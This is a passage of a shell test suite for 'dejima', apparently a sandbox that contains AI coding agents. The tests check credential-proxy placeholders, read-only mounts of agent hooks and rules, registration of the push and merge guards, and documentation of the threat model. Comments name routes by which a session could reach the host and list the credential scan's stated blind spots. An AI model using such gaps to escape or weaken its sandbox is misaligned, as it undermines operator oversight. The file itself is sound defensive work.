    grep -qi 'defeats a lookup, not a route' <<< "$flat" \
        || { echo "the asymmetry is stated without its limit"; return 1; }
}

@test "the threat model owns the use-while-running residual" {
    # security.md is the control-by-control account; the threat model is where
    # a reader looks for what is NOT claimed, and this is the claim a
    # credential proxy most invites someone to overstate.
    local flat
    flat="$(flat_prose "$REPO_ROOT/docs/threat-model.md")"
    grep -qi 'cannot use the model API as you while it runs' <<< "$flat" \
        || { echo "the not-claimed list does not carry it"; return 1; }
    grep -q 'security.md#four-arrangements-and-what-a-session-can-take-from-each' \
        "$REPO_ROOT/docs/threat-model.md" \
        || { echo "nothing points at the arrangement comparison"; return 1; }
}

@test "cline takes where the model is from the provider, and only from there" {
    # base_url used to live on the harness, so two settings could name
    # different places and an unset base_url meant Anthropic implicitly. It is
    # a provider key now (#171): a self-served endpoint is its own provider
    # carrying its own base_url, which is what lets an operator keep a local
    # model configured while using a hosted API.
    #
    # So the harness has no base_url at all, and setting one is an unknown key
    # rather than a second opinion.
    run bash -c 'source "$1"; source "$2"; config_type harness.cline.base_url' _ \
        "$REPO_ROOT/bin/dejima-config-lib.sh" "$REPO_ROOT/bin/dejima-provider-lib.sh"
    [ "$status" -ne 0 ] || { echo "cline still declares a base_url of its own"; return 1; }

    # And an unset provider is a refusal rather than a default, naming both
    # kinds because for this harness either is a valid answer.
    local cfg
    cfg="$(_cline_cfg 'model = m')"
    run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws"
    [ "$status" -ne 0 ] || { echo "launched with no provider"; return 1; }
    [[ "$output" == *"no [harness.cline] backend is set"* ]] || { echo "$output"; return 1; }
    [[ "$output" == *"self-hosted"* ]] || { echo "the self-served option is unnamed: $output"; return 1; }
}

# The providers.json cline is actually given, for one config. Prints it as JSON.
_cline_providers_json() {
    local cfg="$1" out
    _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws" >/dev/null 2>&1 || return 1
    out="$(ls -d "$(sed -n 's/^state_dir *= *//p' "$cfg/config")"/*/settings 2>/dev/null | head -1)"
    [ -n "$out" ] || return 1
    cat "$out/providers.json"
}

@test "cline's provider type follows the provider's api_style, not a second setting" {
    # Anthropic's Messages API and an OpenAI-compatible one are different wire
    # formats and cline has a client for each. Which one to write is the
    # selected provider's api_style, so an operator never has to keep a
    # dialect setting in step with an endpoint by hand.
    local j
    j="$(_cline_providers_json "$(_cline_cfg 'model = m' 'backend = anthropic')")" \
        || { echo "anthropic path produced nothing"; return 1; }
    [ "$(jq -r .lastUsedProvider <<< "$j")" = anthropic ] || { echo "$j"; return 1; }
    # No baseUrl on this path: cline addresses the API by name and the
    # terminator already answers for it.
    [ "$(jq -r '.providers.anthropic.settings.baseUrl // "absent"' <<< "$j")" = absent ] \
        || { echo "$j"; return 1; }

    j="$(_cline_providers_json "$(_cline_cfg 'model = m' 'backend = openrouter')")" \
        || { echo "openrouter path produced nothing"; return 1; }
    [ "$(jq -r .lastUsedProvider <<< "$j")" = openai-compatible ] || { echo "$j"; return 1; }
    # And addressed by the endpoint's REAL hostname, not a loopback one: the
    # terminator answers for that name inside the container and the host-side
    # proxy holds the key, which is what keeps the session looking like one
    # talking to the API directly.
    [ "$(jq -r '.providers["openai-compatible"].settings.baseUrl' <<< "$j")" \
        = "https://openrouter.ai/api/v1" ] || { echo "$j"; return 1; }
    # A placeholder, never a key. The real one is read host-side per request.
    [ "$(jq -r '.providers["openai-compatible"].settings.apiKey' <<< "$j")" \
        = "sandbox-credential-proxy-placeholder" ] || { echo "$j"; return 1; }

    # A model the operator serves takes the same openai-compatible client, and
    # is the one path with no credential anywhere: nothing to withhold.
    j="$(_cline_providers_json "$(_cline_cfg 'model = m' 'backend = self-hosted' '[backend.self-hosted]' "base_url = http://127.0.0.1:8080/v1")")" \
        || { echo "the self-served path produced nothing"; return 1; }
    [ "$(jq -r '.providers["openai-compatible"].settings.apiKey' <<< "$j")" \
        = "dejima-no-credential-needed" ] || { echo "$j"; return 1; }
}

@test "docs/security.md states what the credential scan does not catch" {
    # A best-effort control that reads as a guarantee is worse than none: an
    # operator who thinks nothing can cross stops looking. These four limits
    # are the ones a later tidy-up is most likely to cut as hedging, and each
    # is a real hole someone could otherwise walk into.
    local doc; doc="$REPO_ROOT/docs/security.md"
    local prose; prose="$(flat_prose "$doc")"
    [[ "$prose" == *"What the scan does not catch"* ]] \
        || { echo "the limits section is gone"; return 1; }
    # Whitespace, which is the trade that makes the rest work.
    [[ "$prose" == *"spaces in passphrases"* ]] \
        || { echo "the whitespace limit is not stated"; return 1; }
    # And that it is a trade rather than an oversight.
    [[ "$prose" == *"deliberate trade"* ]] \
        || { echo "the whitespace limit reads as an oversight"; return 1; }
    # Formats it cannot read.
    [[ "$prose" == *"format it cannot parse"* ]] \
        || { echo "the unparseable-file limit is not stated"; return 1; }
    # And the boundary of what is scanned at all.
    [[ "$prose" == *"Anything dejima does not copy"* ]] \
        || { echo "the scope limit is not stated"; return 1; }
    [[ "$prose" == *"read-write mounts"* ]] \
        || { echo "read-write mounts are not named as unscanned"; return 1; }
}

@test "every flag --help offers is one bin/dejima actually parses" {
    # --base-url outlived the setting it fed: the provider axis moved the
    # model's address onto the backend and deleted the flag, and the help page
    # kept advertising it. Passing it answered "unknown option", which is the
    # worst kind of documentation - it is read as a bug in dejima rather than
    # in the text.
    local flag missing=""
    while IFS= read -r flag; do
        [ -n "$flag" ] || continue
        # A flag can be any alternative in a case pattern - `--ro` is the
        # second of `--extra-readonly|--ro)` - so match it wherever it sits in
        # the list rather than only at the start.
        grep -qE "(^|[[:space:]|])${flag}[)|]" "$REPO_ROOT/bin/dejima" \
            || missing="$missing $flag"
    done < <(sed -n '/^Options (each overrides/,/^$/p' <<< "$(bin/dejima --help 2>&1)" \
             | grep -oE '^\s+--[a-z-]+' | tr -d ' ' | sort -u)
    [ -z "$missing" ] || {
        echo "--help offers flags bin/dejima does not parse:$missing" >&2
        false
    }
}

@test "cline brings the operator's own config in, and read-only" {
    # Everything here is either an instruction the agent follows or a program
    # cline runs. A session that could rewrite them would be choosing what
    # happens on the HOST the next time cline starts outside a container.
    local dirs d
    dirs="$(_declared_for cline harness_config_dirs_load DEJIMA_CONFIG_DIRS)"
    for d in /h/.agents/skills /h/.agents/hooks /h/.cline/hooks; do
        grep -q "^$d"$'\t'"ro" <<< "$dirs" \
            || { echo "$d is not mounted read-only: $dirs"; return 1; }
        # scan, because on a Linux host these are routinely symlinks into a
        # dotfiles checkout and the target has to come with them.
        grep -q "^$d"$'\t'"ro"$'\t'"scan" <<< "$dirs" \
            || { echo "$d is not scanned for symlink targets: $dirs"; return 1; }
    done
}

@test "cline's global rules reach the one directory it reads, from both places" {
    # cline loads global rules from Documents/Cline/Rules and nowhere else -
    # ~/.agents/rules reads like its companion and is not read, checked by
    # planting a file in each and asking `cline config` which it had. So
    # ~/.agents/rules is supported by staging INTO the directory that is read.
    local h staged
    h="$(mktemp -d)"
    mkdir -p "$h/.agents/rules" "$h/Documents/Cline/Rules"
    printf 'a\n' > "$h/.agents/rules/aa-only-in-agents.md"
    printf 'b\n' > "$h/Documents/Cline/Rules/bb-only-in-docs.md"
    printf 'from-agents\n' > "$h/.agents/rules/cc-in-both.md"
    printf 'from-docs\n'   > "$h/Documents/Cline/Rules/cc-in-both.md"
    printf 'host\n' > "$h/.agents/rules/00-dejima.md"
    printf '{}\n' > "$h/.agents/rules/dd-not-a-rule.json"
    staged="$(_declared_for_home "$h" cline harness_staged_config_load DEJIMA_STAGED_CONFIG)"

    local f
    for f in aa-only-in-agents bb-only-in-docs; do
        grep -q "Documents/Cline/Rules/$f.md" <<< "$staged" \
            || { echo "$f did not reach the rules directory: $staged"; rm -rf "$h"; return 1; }
    done
    # One entry for a name in both, or it is two bind mounts at one container
    # path. Documents wins: it is cline's own location for this.
    [ "$(grep -c "Documents/Cline/Rules/cc-in-both.md" <<< "$staged")" -eq 1 ] \
        || { echo "a colliding name was staged twice: $staged"; rm -rf "$h"; return 1; }
    grep -q "$h/Documents/Cline/Rules/cc-in-both.md" <<< "$staged" \
        || { echo "the .agents copy won the collision: $staged"; rm -rf "$h"; return 1; }
    # dejima's briefing wins its own name, and entrypoint.sh writes it after
    # the staged files - so staging a host file it overwrites is only noise.
    grep -q "00-dejima.md" <<< "$staged" \
        && { echo "a host 00-dejima.md was staged: $staged"; rm -rf "$h"; return 1; }
    # Only what cline reads out of a rules directory.
    grep -q "dd-not-a-rule.json" <<< "$staged" \
        && { echo "a non-rule file was staged: $staged"; rm -rf "$h"; return 1; }
    rm -rf "$h"
}

@test "cline's rules directory under ~/.agents is deliberately not mounted" {
    # Not mounted where it sits, because cline does not read it there - it is
    # staged into Documents/Cline/Rules instead, which the test above covers.
    # A mount here would put the operator's rules somewhere nothing loads
    # them, which looks like support and is not.
    local dirs
    dirs="$(_declared_for cline harness_config_dirs_load DEJIMA_CONFIG_DIRS)"
    grep -q "^/h/.agents/rules"$'\t' <<< "$dirs" \
        && { echo "~/.agents/rules is mounted, and cline does not read it"; return 1; }
    return 0
}

@test "cline's AGENTS.md is staged, and its settings are seeded writable" {
    # AGENTS.md is instructions the agent follows, so the session gets a
    # root-owned read-only copy: writing the host's would choose what the next
    # session is told.
    local staged
    staged="$(_declared_for cline harness_staged_config_load DEJIMA_STAGED_CONFIG)"
    grep -q "^/h/.agents/AGENTS.md"$'\t'".agents/AGENTS.md" <<< "$staged" \
        || { echo "AGENTS.md is not staged: $staged"; return 1; }

    # The settings files cline rewrites as it runs. A read-only copy would
    # fail the write rather than the persistence, and the persistence is the
    # part that matters: cline_mcp_settings.json names commands cline runs.
    local seed f h
    h="$(mktemp -d)"; mkdir -p "$h/.cline"
    printf '{}\n' > "$h/.cline/settings.json"
    printf '{"mcpServers":{}}\n' > "$h/.cline/cline_mcp_settings.json"
    seed="$(_declared_for_home "$h" cline harness_seed_load DEJIMA_SEED)"
    for f in settings.json cline_mcp_settings.json; do
        grep -q ".cline/$f" <<< "$seed" \
            || { echo "$f is not seeded writable: $seed"; rm -rf "$h"; return 1; }
    done
    rm -rf "$h"
    # And neither is a plain read-write mount of the host's file, which is the
    # one shape that would let a session reach it.
    local dirs
    dirs="$(_declared_for cline harness_config_dirs_load DEJIMA_CONFIG_DIRS)"
    grep -q "^/h/.cline"$'\t'"$" <<< "$dirs" \
        && { echo "~/.cline is mounted read-write wholesale: $dirs"; return 1; }
    return 0
}

@test "only a harness that can be resumed outside dejima says so" {
    # The sentence promising it lived in the core briefing, where it was
    # Claude Code's fact stated as everyone's - and a Cline session reading it
    # would send its operator somewhere that does not work. Core says nothing
    # about resuming now; each harness fragment says what is true of it.
    local core
    core="$(bash -c 'source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"; _briefing_core_closing_a')"
    grep -qi 'outside the container' <<< "$core" \
        && { echo "core still promises a resume: $core"; return 1; }

    # claude-code can, and offers the command.
    local cc
    cc="$(bash -c 'source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        WORKSPACE_DIR=/w briefing_compose none local-only claude-code')"
    grep -qi 'continue this exact session outside the container' <<< "$cc" \
        || { echo "claude-code no longer offers a resume"; return 1; }
    grep -q 'claude --resume' <<< "$cc" \
        || { echo "claude-code's resume command is gone"; return 1; }

    # cline cannot, and says so rather than staying silent: an agent told
    # nothing will offer it anyway.
    local cl
    cl="$(bash -c 'source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        WORKSPACE_DIR=/w briefing_compose none local-only cline')"
    grep -qi 'cannot be continued outside dejima' <<< "$cl" \
        || { echo "cline's briefing does not rule out resuming outside: $cl"; return 1; }
    grep -qi 'do not offer that' <<< "$cl" \
        || { echo "cline's briefing does not tell the agent not to offer it"; return 1; }
    # And it does say what DOES work, or the agent has nothing to tell anyone.
    grep -qi 'launching dejima again' <<< "$cl" \
        || { echo "cline's briefing does not say what continuing looks like"; return 1; }
    # No stale instructions for driving cline on the host.
    grep -q 'CLINE_DATA_DIR' <<< "$cl" \
        && { echo "cline's briefing still tells the operator to run cline on the host"; return 1; }
    return 0
}

@test "the sandbox's hooks reach a session through the overlay, by their baked path" {
    # The registration that replaces the host one. Claude Code merges this
    # layer with ~/.claude/settings.json, so the operator's own hooks still
    # run - which is why dejima no longer needs to write to theirs.
    local h ov; h="$(mktemp -d)"; ov="$(mktemp)"
    mkdir -p "$h/.claude"; echo '{}' > "$h/.claude/settings.json"
    bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        HOME="$1"; DEJIMA_HARNESS_NAME=claude-code
        harness_plugin_load claude-code
        harness_hook harness_prepare_config "$2"
    ' _ "$h" "$ov" >/dev/null 2>&1

    # R3 first: a session that is not told it is sandboxed is the worst
    # failure here, so it is registered whether or not a guard is declared.
    [ "$(jq -r '.hooks.SessionStart[0].hooks[0].command' "$ov")" \
        = "/usr/local/lib/dejima/hooks/sandbox-context.sh" ] \
        || { echo "sandbox-context is not registered: $(cat "$ov")"; rm -rf "$h" "$ov"; return 1; }
    local cmds; cmds="$(jq -r '.hooks.PreToolUse[]?.hooks[]?.command' "$ov")"
    grep -q '/usr/local/lib/dejima/hooks/git-push-guard.sh' <<< "$cmds" \
        || { echo "push guard missing: $cmds"; rm -rf "$h" "$ov"; return 1; }
    grep -q '/usr/local/lib/dejima/hooks/merge-guard.sh' <<< "$cmds" \
        || { echo "merge guard missing: $cmds"; rm -rf "$h" "$ov"; return 1; }
    # Never the host path, which is what this change is about.
    grep -q '.claude/hooks' "$ov" \
        && { echo "the overlay still points into ~/.claude/hooks"; rm -rf "$h" "$ov"; return 1; }
    # And the sandbox override it already carried is still there.
    [ "$(jq -r '.sandbox.enabled' "$ov")" = "false" ] \
        || { echo "the sandbox override was lost"; rm -rf "$h" "$ov"; return 1; }
    rm -rf "$h" "$ov"
}

@test "upgrading takes back the hooks an older install.sh wrote to the host" {
    # Otherwise "dejima does not write to your Claude Code config" is true
    # only of a fresh install, and an operator who has run the old one keeps
    # symlinks and registrations nothing removes.
    local home="$BATS_TEST_TMPDIR/upg" h
    mkdir -p "$home/.claude/hooks"
    for h in sandbox-context.sh git-push-guard.sh merge-guard.sh dejima-notify.sh; do
        ln -s "$REPO_ROOT/hooks/$h" "$home/.claude/hooks/$h"
    done
    jq -n '{hooks: {
        SessionStart: [{matcher: "startup", hooks: [{type: "command",
            command: "$HOME/.claude/hooks/sandbox-context.sh"}]}],
        PreToolUse: [{matcher: "Bash", hooks: [{type: "command",
            command: "$HOME/.claude/hooks/git-push-guard.sh"}]}]}}' \
        > "$home/.claude/settings.json"

    run_install "$home"

    for h in sandbox-context.sh git-push-guard.sh merge-guard.sh dejima-notify.sh; do
        [ ! -e "$home/.claude/hooks/$h" ] \
            || { echo "$h is still linked into ~/.claude/hooks"; return 1; }
        [[ "$(registered_commands "$home")" != *"/$h"* ]] \
            || { echo "$h is still registered: $(registered_commands "$home")"; return 1; }
    done
    # An operator's own file at one of those names is theirs, not dejima's.
    printf '#!/bin/sh\nexit 0\n' > "$home/.claude/hooks/merge-guard.sh"
    chmod +x "$home/.claude/hooks/merge-guard.sh"
    run_install "$home"
    [ -f "$home/.claude/hooks/merge-guard.sh" ] \
        || { echo "an operator's own hook was removed"; return 1; }
}

@test "a launch creates nothing in the operator's ~/.claude" {
    # dejima used to create an empty settings.json and CLAUDE.md there so that
    # staging had something to copy. That is a write to someone else's
    # configuration for dejima's own convenience, and the file it needs is
    # needed in the container rather than on the host.
    local h ov; h="$(mktemp -d)"; ov="$(mktemp)"
    HOME="$h" bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        DEJIMA_HARNESS_NAME=claude-code
        harness_plugin_load claude-code
        harness_hook harness_prepare_config "$1"
    ' _ "$ov" >/dev/null 2>&1 \
        || { echo "a launch on a host with no ~/.claude failed"; rm -rf "$h" "$ov"; return 1; }
    [ -z "$(find "$h" -mindepth 1 2>/dev/null)" ] \
        || { echo "created on the host: $(find "$h" -mindepth 1)"; rm -rf "$h" "$ov"; return 1; }
    rm -rf "$h" "$ov"
}

@test "a placeholder the entrypoint writes cannot be reached from the session" {
    # WHICH files are asked for is covered where they are declared. This is
    # about what the entrypoint does with them: a file dejima creates inside
    # the container must not become a channel back, or somewhere a session can
    # plant something the harness then reads as configuration.
    local e="$REPO_ROOT/docker/entrypoint.sh" blk
    blk="$(sed -n '/for _spec in ${SANDBOX_HARNESS_STAGED_EMPTY/,/^done$/p' "$e")"
    [ -n "$blk" ] || { echo "the entrypoint does not create them at all"; return 1; }
    grep -q 'chown root:root' <<< "$blk" || { echo "not root-owned: $blk"; return 1; }
    grep -q 'chmod 444' <<< "$blk" || { echo "not read-only: $blk"; return 1; }
    # A path that could climb out of $HOME is refused, as with every other
    # container path a manifest or plugin can name.
    grep -q '\*\.\.\*' <<< "$blk" || { echo "traversal is not refused: $blk"; return 1; }
    # An existing file is left alone, or a second launch would blank whatever
    # was staged from the operator's own.
    grep -q '\[ -e "$_dest" \] && continue' <<< "$blk" \
        || { echo "an existing file is not left alone: $blk"; return 1; }
}

@test "every shipped backend is placed in the maturity section" {
    # Two backends in a table read as equally exercised. The harnesses and
    # forges each get a section saying otherwise; the backends had none, so a
    # reader had nothing telling them which of four has actually been used.
    local doc="$REPO_ROOT/docs/providers.md" prose b
    prose="$(flat_prose "$doc")"
    [[ "$prose" == *"Model backend maturity"* ]] \
        || { echo "the backend maturity section is gone"; return 1; }
    # Only that section: every backend is named elsewhere in this document, so
    # searching the whole of it would pass whatever the section said.
    local sect
    sect="$(sed -n '/^### Model backend maturity/,/^### /p' "$doc" | tr -d '*`')"
    [ -n "$sect" ] || { echo "the section is empty"; return 1; }
    # Derived from what ships, so a backend added later fails this until
    # someone says how much it has been used.
    for b in $(bash -c 'source "'"$REPO_ROOT"'/bin/dejima-provider-lib.sh"; provider_list backend'); do
        # flat_prose strips backticks, so the name is matched bare - and
        # bounded, or `anthropic` would match inside `anthropic-api-key` and
        # a backend with no entry would pass on another's.
        grep -qE "(^| )$b[ ,.]" <<< "$sect" \
            || { echo "backend '$b' is not placed in the maturity section"; return 1; }
    done
    # And it says which one has the miles on it, which is the only part a
    # reader choosing between them actually needs.
    [[ "$prose" == *"most miles on it"* ]] \
        || { echo "it does not say which to choose absent another reason"; return 1; }
}
